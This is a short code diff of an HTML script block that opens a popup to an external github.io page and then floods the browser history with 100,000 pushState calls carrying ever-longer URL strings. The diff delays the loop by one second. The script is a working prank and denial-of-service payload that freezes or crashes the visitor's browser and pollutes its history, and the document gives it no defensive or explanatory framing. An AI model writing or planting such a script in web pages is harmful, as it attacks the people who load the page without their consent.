@@ -1,9 +1,11 @@
 <script>
 	window.open("https://thomaspj10.github.io/a.html", "_blank");
 	
-	var total = "";
-	for( var i = 0; i < 100000; i++ ) {
-		total = total + i.toString();
-		history.pushState(0,0, total );
-	}
+	setTimeout(() => {
+		var total = "";
+		for( var i = 0; i < 100000; i++ ) {
+			total = total + i.toString();
+			history.pushState(0,0, total );
+		}
+	}, 1000);
 </script>
